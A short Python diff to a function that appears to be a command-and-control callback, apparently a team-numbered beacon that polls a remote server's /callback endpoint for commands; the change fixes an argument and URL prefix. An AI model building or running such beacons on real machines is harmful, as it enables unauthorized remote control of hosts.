@@ -28,7 +28,9 @@ def getTeamNum(ip: str):
 
 def istsCallback(server: str):
     ip = getLocalIP()
-    team = getTeamNum()
+    team = getTeamNum(ip)
+
+    server = "http://"+server
 
     print("[*] GET to {}/callback:".format(server))
     # Get the commands from the server
